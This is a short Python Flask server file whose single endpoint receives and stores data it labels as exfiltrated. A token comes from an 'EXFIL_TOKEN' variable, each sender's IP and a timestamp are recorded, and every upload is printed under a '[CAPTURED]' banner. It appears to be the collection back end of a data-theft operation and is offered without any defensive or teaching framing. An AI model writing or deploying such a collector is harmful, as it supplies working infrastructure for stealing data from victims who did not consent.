# server.py
from flask import Flask, request, jsonify
import os
import sys
from datetime import datetime

app = Flask(__name__)
TOKEN = os.getenv("EXFIL_TOKEN")
CAPTURE_DIR = "captures"

os.makedirs(CAPTURE_DIR, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload():
    if request.headers.get('X-Token') != TOKEN:
        return "Forbidden", 403

    client_ip = request.headers.get('Cf-Connecting-Ip', request.remote_addr)
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"{CAPTURE_DIR}/{client_ip}_{timestamp}.txt"

    data = request.get_data(as_text=True)
    with open(filename, "w") as f:
        f.write(data)

    # Print to terminal for live display
    print(f"\n✅ [CAPTURED] {client_ip} @ {timestamp}", flush=True)
    print("="*50, flush=True)
    print(data, flush=True, end='')
    print("="*50 + "\n", flush=True)

    return "OK", 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=False)
